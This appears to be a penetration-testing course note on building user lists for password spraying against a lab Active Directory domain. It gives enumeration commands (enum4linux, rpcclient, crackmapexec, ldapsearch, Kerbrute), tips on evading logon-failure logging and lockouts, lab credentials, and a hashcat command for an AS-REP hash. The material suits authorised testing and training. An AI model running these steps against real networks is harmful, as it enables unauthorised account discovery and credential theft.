# Section 10 — Password Spraying: Building a Target User List

## Methods (choose based on access level)

| Access Level | Method |
|-------------|--------|
| No creds, SMB NULL session available | enum4linux, rpcclient, crackmapexec --users |
| No creds, LDAP anon bind available | ldapsearch, windapsearch |
| No creds, neither available | Kerbrute + wordlist, LinkedIn, email harvesting |
| Valid creds | crackmapexec --users (fastest, also shows badpwdcount) |

---

## SMB NULL Session — Pull User List

### enum4linux
```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### rpcclient
```bash
rpcclient -U "" -N 172.16.5.5
# then:
enumdomusers
```

### crackmapexec (unauthenticated NULL session)
```bash
crackmapexec smb 172.16.5.5 --users
```

**crackmapexec `--users` shows `badpwdcount`** — critical for spraying safely. Remove any account near the lockout threshold from your list before spraying.

---

## LDAP Anonymous Bind — Pull User List

### ldapsearch
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

### windapsearch
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
`-u ""` = anonymous bind, `-U` = users only

---

## Kerbrute — Username Enumeration (No Creds Needed)

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

**Why Kerbrute is stealthy for enumeration:**
- Uses Kerberos Pre-Authentication — does NOT generate Event ID 4625 (logon failure)
- Generates Event ID 4768 (TGT requested) — only logged if Kerberos audit is enabled
- Does not lock out accounts during enumeration phase

**Switch to spraying with Kerbrute = failed attempts DO count toward lockout threshold.**

Wordlists:
```
/opt/jsmith.txt                                    # common flast format
~/SecLists/Usernames/xato-net-10-million-usernames.txt
```

---

## Credentialed Enumeration — crackmapexec

```bash
crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' --users
```

Gives full user list + `badpwdcount` + `baddpwdtime` per account.

**Filter out accounts near lockout threshold before spraying:**
```bash
crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' --users | grep -v "badpwdcount: [3-9]"
```

---

## Pre-Spray Logging Checklist

Always document before and during a spray:
- [ ] Accounts targeted
- [ ] DC used
- [ ] Time and date of each spray
- [ ] Password(s) attempted

If an account lockout occurs → hand notes to client to cross-check their logs.

---

## Decision Tree — Which Method to Use

```
Have valid creds?
  YES → crackmapexec --users (fastest, shows badpwdcount)
  NO  → SMB NULL session available?
          YES → enum4linux / rpcclient / crackmapexec --users (no creds)
          NO  → LDAP anon bind available?
                  YES → ldapsearch / windapsearch
                  NO  → Kerbrute + jsmith.txt / linkedin2username
```

---

## Lab Results (INLANEFREIGHT.LOCAL)

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
# Result: 56 valid usernames from 48,705 tested in ~11 seconds
```

**Bonus find:** `mmorgan` flagged as AS-REP roastable (no pre-auth required) — hash dumped automatically by Kerbrute:
```
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
```
Crack with: `hashcat -m 18200 mmorgan.hash /usr/share/wordlists/rockyou.txt`

---

## Exam Notes

- `crackmapexec --users` is best when credentialed — badpwdcount tells you who to skip
- Kerbrute enumeration = stealthy (no 4625 events), spraying = not stealthy (counts toward lockout)
- SYSTEM access on domain-joined host = can enumerate AD like a domain user
- Always check badpwdcount before spraying — skip accounts at 3+ if threshold is 5
- Log everything — time, date, accounts, passwords tried
